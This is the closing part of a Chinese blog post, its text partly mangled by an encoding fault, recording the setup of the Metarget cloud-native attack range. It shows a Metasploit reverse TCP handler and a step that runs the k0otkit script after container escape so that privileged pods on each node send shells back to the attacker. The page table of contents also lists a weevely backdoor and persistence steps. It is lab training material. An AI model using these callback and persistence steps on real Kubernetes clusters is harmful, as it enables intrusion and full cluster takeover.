class="token number">4444</span></pre></td></tr><tr><td data-num="7"></td><td><pre>ExitOnSession <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Exploit running as background job <span class="token number">0</span>.</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Exploit completed, but no session was created.</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">0.0</span>.0.0:4444 </pre></td></tr><tr><td data-num="12"></td><td><pre>msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308200434755.png" alt="image-20220308200434755"></p><p>ç„¶åå¤åˆ¶ k0otkit.sh æ–‡ä»¶å†…å®¹åˆ°å®¹å™¨é€ƒé€¸åçš„ root shell ä¸­è¿è¡Œï¼Œæ”»å‡»è€…çš„æœºå™¨ä¼šæ”¶åˆ°ä¼ å›æ¥çš„ sessionï¼š</p><p>k0otkit åœ¨æ¯ä¸ªèŠ‚ç‚¹ä¸Šåˆ›å»ºäº†ä¸€ä¸ªç‰¹æƒ Podï¼Œè¯¥ Pod ä¸èŠ‚ç‚¹å…±äº« Net å’Œ PID å‘½åç©ºé—´ï¼Œå¹¶ä¸”åœ¨å®¹å™¨å†…çš„ /var/kube-proxy-cache è·¯å¾„æŒ‚è½½äº†å®¿ä¸»æœºçš„æ ¹ç›®å½•ï¼Œä¸Šé¢ msfconsole æ”¶åˆ°çš„æ­£æ˜¯ç”±è¿™äº›ç‰¹æƒ Pod åå¼¹å›æ¥çš„ shellã€‚å€ŸåŠ©è¿™äº›ç»è¿‡å»éš”ç¦»çš„ç‰¹æƒ Podï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿åœ°æ§åˆ¶é›†ç¾¤ã€‚</p><h2 id="å‚è€ƒé“¾æ¥"><a class="anchor" href="#å‚è€ƒé“¾æ¥">#</a> å‚è€ƒé“¾æ¥ï¼š</h2><p><span class="exturl" data-url="aHR0cDovL2Jsb2cubnNmb2N1cy5uZXQvbWV0YXJnZXQv">METARGETï¼šäº‘åŸç”Ÿæ”»é˜²é¶åœºå¼€æºå•¦ï¼</span></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbWljcjA2Ny9wLzE1NDg5MTA3Lmh0bWw=">äº‘åŸç”Ÿæ”»é˜²é¶åœº - Metarget</span></p><div class="tags"><a href="/tags/SNote/" rel="tag"><i class="ic i-tag"></i> SNote</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">æ›´æ–°äº</span> <time title="ä¿®æ”¹æ—¶é—´ï¼š2022-03-25 18:42:19" itemprop="dateModified" datetime="2022-03-25T18:42:19+08:00">2022-03-25</time> </span><span id="article/b3617362.html" class="item leancloud_visitors" data-flag-title="äº‘åŸç”Ÿæ”»é˜²é¶åœº-Metargetæ­å»ºè®°å½•" title="é˜…è¯»æ¬¡æ•°"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">é˜…è¯»æ¬¡æ•°</span> <span class="leancloud-visitors-count"></span> <span class="text">æ¬¡</span></span></div><div id="copyright"><ul><li class="author"><strong>æœ¬æ–‡ä½œè€…ï¼š </strong>21r000 <i class="ic i-at"><em>@</em></i>æœªå…¥æ±Ÿæ¹–ï¼Œæ€æ•¢ä½©åˆ€</li><li class="link"><strong>æœ¬æ–‡é“¾æ¥ï¼š</strong> <a href="https://www.21r000.xyz/article/b3617362.html" title="äº‘åŸç”Ÿæ”»é˜²é¶åœº-Metargetæ­å»ºè®°å½•">https://www.21r000.xyz/article/b3617362.html</a></li><li class="license"><strong>ç‰ˆæƒå£°æ˜ï¼š </strong>æœ¬ç«™æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/article/5c387dcc.html" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;21r000-image.oss-cn-shanghai.aliyuncs.com&#x2F;pic2021&#x2F;6833939bly1gipeubcbajj20zk0m8h1h.jpg" title="é€†å‘å·¥ç¨‹Studying Notes Days 3"><span class="type">ä¸Šä¸€ç¯‡</span> <span class="category"><i class="ic i-flag"></i> é€†å‘å·¥ç¨‹</span><h3>é€†å‘å·¥ç¨‹Studying Notes Days 3</h3></a></div><div class="item right"><a href="/article/77a28503.html" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;21r000-image.oss-cn-shanghai.aliyuncs.com&#x2F;pic2021&#x2F;6833939bly1gipexbei4hj20zk0m8npd.jpg" title="CVE-2022-0847 Linuxå†…æ ¸ææƒæ¼æ´å¤ç°"><span class="type">ä¸‹ä¸€ç¯‡</span> <span class="category"><i class="ic i-flag"></i> æ¼æ´å¤ç°</span><h3>CVE-2022-0847 Linuxå†…æ ¸ææƒæ¼æ´å¤ç°</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="æ–‡ç« ç›®å½•"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BE%E8%AE%A1%E7%90%86%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text">è®¾è®¡ç†å¿µ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">å®‰è£…æ•™ç¨‹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%90%AFubuntu1804%E5%BC%80%E5%90%AFroot%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95"><span class="toc-number">2.1.</span> <span class="toc-text">å¼€å¯ Ubuntu18.04 å¼€å¯ root è¿œç¨‹ç™»å½•</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%99ubuntu1804%E6%9B%B4%E6%8D%A2%E5%9B%BD%E5%86%85%E6%BA%90"><span class="toc-number">2.2.</span> <span class="toc-text">ç»™ Ubuntu18.04 æ›´æ¢å›½å†…æº</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85docker"><span class="toc-number">2.3.</span> <span class="toc-text">å®‰è£… docker</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E9%A1%B9%E7%9B%AE"><span class="toc-number">2.4.</span> <span class="toc-text">å®‰è£…é¡¹ç›®</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE%E6%B5%8B%E8%AF%95"><span class="toc-number">2.5.</span> <span class="toc-text">é¡¹ç›®æµ‹è¯•</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#find%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83"><span class="toc-number">2.5.1.</span> <span class="toc-text">find å‘½ä»¤ææƒ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#weevely%E5%90%8E%E9%97%A8%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.5.2.</span> <span class="toc-text">weevely åé—¨è¿æ¥</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%B9%E5%99%A8%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.6.</span> <span class="toc-text">å®¹å™¨æ¢æµ‹ï¼š</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8"><span class="toc-number">2.7.</span> <span class="toc-text">å®¹å™¨é€ƒé€¸ï¼š</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E9%9B%86%E7%BE%A4%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">2.8.</span> <span class="toc-text">æ§åˆ¶é›†ç¾¤ + æƒé™ç»´æŒï¼š</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">3.</span> <span class="toc-text">å‚è€ƒé“¾æ¥ï¼š</span></a></li></ol></div><div class="related panel pjax" data-title="ç³»åˆ—æ–‡ç« "><ul><li><a href="/article/141d7194.html" rel="bookmark" title="ä½¿ç”¨PicGo+Github/Gitee+Typroaæ­å»ºå±äºè‡ªå·±çš„å›¾åºŠ">ä½¿ç”¨PicGo+Github/Gitee+Typroaæ­å»ºå±äºè‡ªå·±çš„å›¾åºŠ</a></li><li><a href="/article/9f3a01f6.html" rel="bookmark" title="kali å®‰è£…gmpy2æŠ¥é”™é—®é¢˜æ€»ç»“">kali å®‰è£…gmpy2æŠ¥é”™é—®é¢˜æ€»ç»“</a></li><li><a href="/article/6503e9cb.html" rel="bookmark" title="VM16 è™šæ‹ŸæœºWin7æ— æ³•å®‰è£…VM toolsè§£å†³æ–¹æ³•">VM16 è™šæ‹ŸæœºWin7æ— æ³•å®‰è£…VM toolsè§£å†³æ–¹æ³•</a></li><li><a href="/article/1df94188.html" rel="bookmark" title="ä¸€ç¯‡æ–‡ç« æ•™ä¼šä½ å¦‚ä½•æ›´ä¸ºç®€ä¾¿çš„ä½¿ç”¨Win32-API">ä¸€ç¯‡æ–‡ç« æ•™ä¼šä½ å¦‚ä½•æ›´ä¸ºç®€ä¾¿çš„ä½¿ç”¨Win32-API</a></li><li><a href="/article/60ec5e3d.html" rel="bookmark" title="Just Do It For Play : bingdundun">Just Do It For Play : bingdundun</a></li><li class="active"><a href="/article/b3617362.html" rel="bookmark" title="äº‘åŸç”Ÿæ”»é˜²é¶åœº-Metargetæ­å»ºè®°å½•">äº‘åŸç”Ÿæ”»é˜²é¶åœº-Metargetæ­å»ºè®°å½•</a></li><li><a href="/article/f49682ad.html" rel="bookmark" title="Windowsä¸Šæ­å»ºELKæ¯«ç§’çº§å“åº”è›‡å·¥è£¤è®°å½•">Windowsä¸Šæ­å»ºELKæ¯«ç§’çº§å“åº”è›‡å·¥è£¤è®°å½•</a></li><li><a href="/article/acfa1bff.html" rel="bookmark" title="å„ç±»æŠ¥é”™é—®é¢˜æ€»ç»“">å„ç±»æŠ¥é”™é—®é¢˜æ€»ç»“</a></li></ul></div><div class="overview panel" data-title="ç«™ç‚¹æ¦‚è§ˆ"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="21r000" data-src="/images/avatar.jpg"><p class="name" itemprop="name">21r000</p><div class="description" itemprop="description">å›ºæ€è§„åˆ™é•¿æ–¹ä½“ç©ºé—´ç§»åŠ¨å·¥ç¨‹å¸ˆ</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">75</span> <span class="name">æ–‡ç« </span></a></div><div class="item categories"><a href="/categories/"><span class="count">12</span> <span class="name">åˆ†ç±»</span></a></div><div class="item tags"><a href="/tags/"><span class="count">15</span> <span class="name">æ ‡ç­¾</span></a></div></nav><div class="social"><span class="exturl item Github" data-url="aHR0cHM6Ly9naXRodWIuY29tLzIxcjAwMA==" title="https:&#x2F;&#x2F;github.com&#x2F;21r000"><i class="ic i-github"></i></span> <span class="exturl item QQ" data-url="dGVuY2VudDovL21lc3NhZ2UvP3Vpbj0yODU1MTQ1MTEzJlNpdGU9Jk1lbnU9eWVz" title="tencent:&#x2F;&#x2F;message&#x2F;?uin&#x3D;2855145113&amp;Site&#x3D;&amp;Menu&#x3D;yes"><i class="ic i-qq"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>é¦–é¡µ</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>å…³äº</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>æ–‡ç« </a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>å½’æ¡£</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>åˆ†ç±»</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>æ ‡ç­¾</a></li></ul></li><li class="item"><a href="/books/" rel="section"><i class="ic i-instagram"></i>å›¾ä¹¦é˜</a></li><li class="item"><a href="/encode/" rel="section"><i class="ic i-flag"></i>åœ¨çº¿ç¼–ç </a></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>å‹è”</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>ä¼ é€é˜µ</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/article/5c387dcc.html" rel="prev" title="ä¸Šä¸€ç¯‡"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/article/77a28503.html" rel="next" title="ä¸‹ä¸€ç¯‡"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>éšæœºæ–‡ç« </h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="åˆ†ç±»äº æ¼æ´å¤ç°">æ¼æ´å¤ç°</a></div><span><a href="/article/a3856889.html" title="CVE-2021-44228-Log4j2-RCEæ¼æ´å¤ç°">CVE-2021-44228-Log4j2-RCEæ¼æ´å¤ç°</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="åˆ†ç±»äº å†…ç½‘æ¸—é€">å†…ç½‘æ¸—é€</a></div><span><a href="/article/64fd8041.html" title="windowsè®¤è¯ç³»åˆ—å’ŒåŸŸå‰ç½®çš„ç®€å•äº†è§£">windowsè®¤è¯ç³»åˆ—å’ŒåŸŸå‰ç½®çš„ç®€å•äº†è§£</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="åˆ†ç±»äº æ¼æ´å¤ç°">æ¼æ´å¤ç°</a></div><span><a href="/article/1b0513b6.html" title="Dingtalk6.3.5 and å‘æ—¥è‘µRCEå¤ç°">Dingtalk6.3.5 and å‘æ—¥è‘µRCEå¤ç°</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/" title="åˆ†ç±»äº é€†å‘å·¥ç¨‹">é€†å‘å·¥ç¨‹</a></div><span><a href="/article/5c387dcc.html" title="é€†å‘å·¥ç¨‹Studying Notes Days 3">é€†å‘å·¥ç¨‹Studying Notes Days 3</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="åˆ†ç±»äº å†…ç½‘æ¸—é€">å†…ç½‘æ¸—é€</a></div><span><a href="/article/1df695da.html" title="Active DirectoryåŸŸæœåŠ¡ï¼šåŸŸä¿¡ä»»">Active DirectoryåŸŸæœåŠ¡ï¼šåŸŸä¿¡ä»»</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/vulnhub%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98/" title="åˆ†ç±»äº vulnhubé¶æœºå®æˆ˜">vulnhubé¶æœºå®æˆ˜</a></div><span><a href="/article/3f0418ee.html" title="vulnhubé¶åœºå®æˆ˜-CH4INRULZ_v1.0.1">vulnhubé¶åœºå®æˆ˜-CH4INRULZ_v1.0.1</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="åˆ†ç±»äº CTF">CTF</a></div><span><a href="/article/4610d5dd.html" title="å››è¿›åˆ¶è§£ç ">å››è¿›åˆ¶è§£ç </a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="åˆ†ç±»äº CTF">CTF</a></div><span><a href="/article/b5c81d74.html" title="CTFshow æœˆé¥¼æ¯crypto1_ä¸­ç§‹æœˆwp">CTFshow æœˆé¥¼æ¯crypto1_ä¸­ç§‹æœˆwp</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="åˆ†ç±»äº CTF">CTF</a></div><span><a href="/article/a7cc6afa.html" title="CTFshowæœˆé¥¼æ¯Crypto3_å¤šå°‘ç¦»æ¯WP">CTFshowæœˆé¥¼æ¯Crypto3_å¤šå°‘ç¦»æ¯WP</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="åˆ†ç±»äº å†…ç½‘æ¸—é€">å†…ç½‘æ¸—é€</a></div><span><a href="/article/ffbd8b0.html" title="windowsä¿¡æ¯æœé›†ç¯‡ï¼ˆäºŒï¼‰ä¹‹SPN">windowsä¿¡æ¯æœé›†ç¯‡ï¼ˆäºŒï¼‰ä¹‹SPN</a></span></li></ul></div><div><h2>æœ€æ–°è¯„è®º</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2021 â€“ <span itemprop="copyrightYear">2022</span> <span class="with-love"><i class="ic i-"></i> </span><span class="author" itemprop="copyrightHolder">21r000 @ 21r000</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="ç«™ç‚¹æ€»å­—æ•°">302k å­—</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="ç«™ç‚¹é˜…è¯»æ—¶é•¿">4:35</span></div><div><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_pv">æœ¬ç«™æ€»è®¿é—®é‡ï¼š<span id="busuanzi_value_site_pv"></span>æ¬¡</span> <span class="post-meta-divider">|</span> <span id="busuanzi_container_site_uv" style="display:none">æœ¬ç«™è®¿å®¢æ•°ï¼š<span id="busuanzi_value_site_uv"></span>äºº</span></div><div class="beian-info"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">æµ™ICPå¤‡2022001000å·-1</a></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"article/b3617362.html",favicon:{show:"ï¼ˆâ—Â´3ï½€â—ï¼‰å¤§é€šã‚Šã‹ã‚‰ã‚¸ã‚§ãƒ¼ãƒ³ã¾ã§",hide:"(Â´Ğ”ï½€)é‡‘ã‚’ç‹¬è¡Œã™ã‚‹"},search:{placeholder:"æ–‡ç« æœç´¢",empty:"å…³äº ã€Œ ${query} ã€ï¼Œä»€ä¹ˆä¹Ÿæ²¡æœåˆ°",stats:"${time} ms å†…æ‰¾åˆ° ${hits} æ¡ç»“æœ"},valine:!0,fancybox:!0,copyright:'å¤åˆ¶æˆåŠŸï¼Œè½¬è½½è¯·éµå®ˆ <i class="ic i-creative-commons"></i>BY-NC-SA åè®®ã€‚',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({pluginRootPath:"live2dw/",pluginJsPath:"lib/",pluginModelPath:"assets/",tagMode:!1,model:{jsonPath:"/live2dw/assets/wanko.model.json"},display:{position:"right",width:150,height:200},mobile:{show:!1},log:!1})</script></body></html><!-- rebuild by hrmmi -->